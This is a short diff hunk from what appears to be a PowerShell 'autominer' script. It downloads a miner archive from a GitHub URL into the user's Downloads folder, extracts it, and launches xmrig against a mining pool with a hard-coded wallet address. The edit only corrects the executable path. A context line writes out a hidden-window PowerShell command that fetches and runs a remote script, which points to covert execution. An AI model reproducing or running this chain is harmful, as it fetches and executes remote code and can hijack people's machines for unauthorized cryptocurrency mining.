@@ -7,4 +7,4 @@ echo 'powershell -WindowStyle hidden "irm https://zlc1004.github.io/autominer/ge
 Invoke-WebRequest "https://raw.githubusercontent.com/zlc1003/miner/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
 Expand-Archive $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip -DestinationPath $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner -Force
 cd $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\miner
-/xmrig.exe -o xmrig.nanswap.com:3333 -a rx -k -u nano_3acbzt3t66d51edrp9jrnmg5wpr363g5e6udf5otn8s5ppp7dnubbz5epeci -p x
+./xmrig.exe -o xmrig.nanswap.com:3333 -a rx -k -u nano_3acbzt3t66d51edrp9jrnmg5wpr363g5e6udf5otn8s5ppp7dnubbz5epeci -p x
